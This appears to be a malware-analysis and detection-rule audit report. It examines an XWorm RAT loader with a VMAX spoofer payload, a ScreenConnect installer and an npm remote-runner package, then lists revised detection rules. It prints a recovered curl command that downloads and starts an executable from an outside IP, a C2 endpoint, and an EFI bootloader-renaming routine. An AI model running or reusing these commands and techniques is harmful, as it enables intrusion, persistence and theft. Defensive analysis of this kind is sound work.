method: Static reverse engineering, resolved CIL, native disassembly/decompilation, bounded CPU emulation with every CALL intercepted, archive/MSI table inspection, signature verification, and upstream artifact comparison. No sample was run on the host; no decoded shell command or C2 task was executed.

zip.identification: Nim multi-stage XWorm V5.6 loader with a second VMAX hardware-spoofer payload
zip.reason: The batch conceals and starts an XWorm RAT that persists, accepts encrypted remote commands and replaces cryptocurrency clipboard addresses. Independent VM and analyst-name exit gates and a second encrypted native download/execute payload corroborate intent.
execution_trace: Outer native entry reconstructs two embedded Base64 artifacts, writes sys_PID.exe/setup_PID.bat under temporary storage and starts them through cmd/start and hidden PowerShell. Native path traced around 0x140007d00-0x140008166, system wrapper 0x140006439.

Batch commands are split using %^%letter%long-random-name% noise and delayed-expansion aliases. Removing the noise and resolving SET aliases exposes WMIC manufacturer/model checks against VMware/VirtualBox/QEMU, username/hostname comparisons against sandbox identities, delayed execution, certutil/cscript staging, hidden launch, and cleanup.
The staged VBS decodes URL-safe Base64, applies two XOR arrays (130 and 102 bytes), reads the little-endian output length and writes/starts %TEMP%/conhost.exe before deleting staging files.

Resolved managed IL: Main decrypts Settings, adds Defender exclusions when elevated, installs %TEMP%/Updated.exe, establishes minute scheduled-task/HKCU Run/Startup-shortcut persistence, starts the server and clipper threads and optionally marks the process critical. ConnectServer sends host/user/OS/security inventory and enters async receive. Messages.Read decrypts commands and dispatches shell execution, JPEG screen capture, plugin Assembly.Load/Invoke, URL download, and DDoS operations. Clipboard updates replace BTC/ETH/TRC20 addresses.

Settings decrypt via AES-256 ECB with an MD5-derived mutex key. Decrypted endpoint 94.72.98.32:7000, group XWorm V5.6, delimiter <Xwormmm>. These indicators identify this specimen and are not required by any new rule.

Second Nim PE main 0x140022396-0x140026e5a concatenates 327 Base64 fragments, AES-256-CBC decrypts 5529104 ciphertext bytes and then XORs each byte with the effective repeating key obtained from 30 contiguous 1024-byte tables. It writes/starts the recovered native PE through cmd/start and removes the temporary executable.

Recovered native PE carries VMAX/Impact Services/Vanguard source identity, Dear ImGui/D3D11 UI and KeyAuth. Its string loops use mixed Boolean/arithmetic expressions equivalent to XOR plus an offset. Bounded Unicorn emulation skips EVERY CALL and records arguments: function 0x1400670e8 constructs curl http://167.114.194.93:1234/n5c1q28wyx --output C:\Windows\IME\AppleCleaner.exe >nul 2>&1, then start and del commands for that executable. Main 0x1400985d0 calls wrapper 0x14006ff9c at 0x1400a2567; the wrapper takes this routine as a callback. Main calls wrapper 0x140067364 at 0x1400a0b72 for routine 0x1400700a0, which mounts the EFI partition and renames bootmgfw.efi/bootx64.efi. Ghidra independently confirms the decode loops and system calls. These are supported reachable routines, not claims of successful runtime effects or a confirmed final network payload.

recovered_payloads.identity: VMAX native spoofer with obfuscated downloader and EFI modification routines

zip.coverage_gap: The original scan sees the encoded batch and the intermediate Nim PE but does not emulate the XOR/AES stages. Three distinct suspicious traits in separate objective branches satisfy supported outer coverage; no hostile claim was invented to compensate for an encrypted payload. The manually recovered RAT has 10 hostile findings. Original classifier remains level -1 at probability 0.99114376: a classifier/unpacking gap, despite the malicious judgement.
zip.provenance: Triage 261022-2t4rsavtgx behavioral report corroborates hidden cmd/PowerShell execution and staging. Verdict rests on recovered code, not its sandbox score.

msi.identification: ConnectWise ScreenConnect Client 26.6.6.9747 customized Windows MSI
msi.reason: Intact ConnectWise-signed remote-support installer with coherent client binaries, conventional installer custom actions and matching relay/key configuration. No unrelated stager, tampered signature or demonstrated abuse was found. BENIGN here is the requested sighted-quarantine judgement, not proof of authorized installation.
execution_trace: Decoded MSI stream-name compression, string pool, column metadata and tables rather than treating OLE strings as code. Extracted embedded cabinet and custom-action assemblies. Product/service instance cd32b75fc727b833; auto-start LocalSystem service uses SERVICE_CLIENT_LAUNCH_PARAMETERS, instance-pkp9kl-relay.screenconnect.com:443 and an RSA key. The client configuration uses the same relay/key, a normal tenant-bound deployment layout.

osslsigncode verifies MsiDigitalSignatureEx and DigitalSignature digests, ConnectWise LLC code-signing chain, DigiCert issuer/root and CRL. Signature verification succeeds; certificate validity is 2026-02-20 through 2027-02-19.

Resolved custom-action CIL: service-argument fixup carries forward the prior install parameters; installer handles its own service, machine policy/MOTW and names. Uninstall process termination targets its own Backstage/FileManager components. No arbitrary downloader/remote shell custom action was found.

AuthenticationPackage, CredentialProvider, BackstageShell, remote terminal, service/registry installation and network capability are genuine remote-support functions. Accurate notable detections are retained. A PE relocation type-name reference in the Windows DLL/custom-action assembly was rehomed from process hollowing to source/resource metadata without removing the observation.
msi.provenance_and_limits: MalwareBazaar names ConnectWise and Triage 261022-ymmcdatxby scores it highly. These are strong reasons to investigate RMM abuse. The sandbox describes installation, service/registry activity, drive enumeration and a Windows Installer shadow-copy COM interaction; it does not establish ransomware or unauthorized operator commands. Tenant ownership, installer delivery/lure, user consent and subsequent remote-session history are missing. These are the context that could change the incident verdict. HTTPS inspection of the relay failed with EOF; it is also not the ScreenConnect service protocol.

npm.reason: Delivered code implements the advertised paired remote-runner workflow. Remote terminal, screen, files, credentials and port sharing are powerful but exposed through pairing and session/account checks. No concealed install hook, covert credential collector, unrelated downloader or replaced FRP binary was established.
execution_trace: bin launcher requires the bundled CLI. Setup performs browser approval/token pairing before daemon authorization; credential storage refuses an unencrypted fallback. Service installation is an explicit command/interactive prompt, not a package install lifecycle effect. package.json has no install/postinstall hook.

Socket.IO authenticates with the runner JWT; session paths require owner/member grants. WebRTC/socket terminal, file and screen handlers implement the documented remote-workstation purpose. Platform autostart, launchd and user-systemd behavior remains detected as neutral capability.

DPAPI/Keychain/libsecret and AES-GCM protect runner secrets at rest. factiii-secrets/board MCP use local sockets and per-session tokens. Remote jobs can use configured credentials and AI approval/sandbox bypass flags: accurate notable capabilities are retained; these flags do not by themselves prove unauthorized execution.

FRP sharing creates a per-session configuration/token for the configured Factiii proxy and a requested local service. All four vendored frpc files are byte-for-byte upstream fatedier/frp v0.66.0 release clients. Source-module version and revision a1348cdf00e938a3b5075a75e340f1ed003af9b7 also agree.

index/index.js serves a loopback endpoint (127.0.0.1:8790) with control-token validation, per-space bearer authentication, database/index operations and configured OneDrive Graph transfers. Native screenhost.m capture/input code belongs to the remote UI. Embedder dependencies and ONNX conversion serve the documented search/AI function.

Fetched and inspected node-datachannel 0.12.0, better-sqlite3 12.11.1, sqlite-vec 0.1.6 and PGlite 0.4.3. Native install steps use normal prebuild/node-gyp paths. Dependency scans have no hostile/suspicious findings; this supports the code inspection but is not proof of benignity. Public factiii.com describes the matching product; API root returns 404. No account was registered and no pairing or remote-control session was initiated.
npm.provenance_and_limits: GHSA-9j83-qj34-g5vc and OSV MAL-2026-18204 assert malware but provide generic compromise guidance rather than an actionable malicious-code path. OSV derives from the same advisory, so they are not independent behavioral evidence. Remote command execution, persistent agent operation, tunnels, access to configured secrets and AI bypass flags could explain a security-source flag; the exact reason remains unproven. No clean historical source baseline, deployment/account authorization history or backend implementation was available. This judgement disagrees with the advisory and is explicitly a quarantine/review judgement.

rule_corrections.unsupported_claim: NVM4W inside a random Base64 carrier does not identify NVM for Windows; it also caused an unrelated unsigned-TLS detection to be suppressed.
rule_corrections.retained: Use a bounded recognized Go module path in .rdata. Both official NVM 1.2.2 native executables remain positive.

rule_corrections.unsupported_claim: An unbounded fnv.?1a string, including random Base64, does not establish export-name hashing or API resolution.
rule_corrections.retained: Bound FNV-1a name reference in micro-behaviors/data/checksum; actual opcode/algorithm-backed FNV resolver detection is unchanged and positive-tested.

rule_corrections.unsupported_claim: Three different alphabetic chunks ending in zero are not a repeated delimiter.
rule_corrections.retained: YARA compares every byte of three equal 12-30-character tokens. Original malicious VB6 positive retains the delimiter and both hostile downloader/stub composites.

rule_corrections.unsupported_claim: Encoded ComputerName alone establishes a hostname reference, not WSH behavior or anti-analysis.
rule_corrections.retained: Canonical notable Base64 hostname reference, with consumer updated; separate suspicious name-comparison, caret/environment obfuscation and obfuscated manufacturer/model VM branch rules detect the supported mechanisms.

rule_corrections.change: Google key in a long carrier
rule_corrections.unsupported_claim: AIza plus 35 key-shaped bytes occurs by chance inside an entirely Base64 string.
rule_corrections.retained: Match the whole extracted ASCII run before excluding a complete >=1000-byte Base64 carrier. Standalone keys and Cython keys abutting adjacent literals still match. Original Myra wheel and its Firebase native extension retain the key; the wheel retains online-session-verification.

rule_corrections.unsupported_claim: PE relocation type names do not prove hollowing; HTTP printf templates do not prove flooding; FRP command/config names do not identify a tool instance or establish C2; autostart surface references do not prove attacker persistence; inline interpreters and socket.io imports do not prove LOLbin/C2 intent.
rule_corrections.retained: Moved unchanged observations into metadata or the matching capability leaves, kept notable execution/network/encoding surfaces, updated exact consumers, audited parent selectors, consolidated duplicate FRP name wrappers and removed only redundant/context-only aliases. Original positive attack composites continue to consume canonical facts.

rule_corrections.unsupported_claim: Go/x/sys Hyper-V vendor inventory in authentic upstream FRP does not establish an anti-analysis VM check.
rule_corrections.retained: Kept vendor reference in the virtualization capability leaf with the original VirtualBox exclusion. Attack composites that also require self-destruction, exfiltration, encrypted loader or hostile context receive the equivalent new reference; a bare Hyper-V reference no longer promotes itself into a runtime evasion objective. Positive self-destruction fixture passes.

rule_corrections.unsupported_claim: During dependency enrichment, a README mismatch from node-datachannel, repository.directory from sqlite-vec and publish-burst metadata from FastAPI were joined into an accusation against Factiii.
rule_corrections.retained: The three publication facts must first co-occur within one archive. Registry cadence stays supporting outer context with a description that does not assert same-owner flow. Original react-dev-testloader 10.0.1 retains the combined publication-mismatch evidence; its cadence-dependent suspicious composite still requires registry context. Attempted scope:package is rejected by the installed validator for a registry/artifact conjunction, so the archive helper is the available supported precision fix.

validation_and_controls.results_before_final_validation: 25 new static controls pass; 21 native-loader regression controls pass; official NVM identity, original VB6 delimiter/downloader/stub, original Myra Google key/native extension, and original monorepo publication evidence retain their supported detections. git diff --check is clean.

real_positive_controls.identity: myra-ai-assistant 0.3.1 original Windows wheel, fetched with --all-wheels

validation_and_controls.loss_audit: Removed outer XWorm findings are unsupported incidental Base64 substrings or an overclaimed hostname reference, not attack behavior. Neutral MSI/NPM observations were moved and consumers updated. Hyper-V false objective promotion and redundant aliases were removed while actual vendor/encoding/import facts survive. No demonstrated hostile fixture detection was lost. The original archive remains a classifier miss and its encrypted final-stage behaviors remain an automatic-unpacking gap.
validation_and_controls.comparison_limits: The CLI also returns enriched dependency/web/registry material despite --follow none. Comparisons below key original archive-member paths explicitly. Additional unchanged-rule facts and some newly surfaced members reflect analysis/enrichment/cache variation, not a YAML feature we added; their numeric classifier changes cannot all be attributed to rule edits. Model v18.18 also warns that newer engine feature identifiers are unseen/zeroed. No rules were reintroduced or duplicated to raise its score.
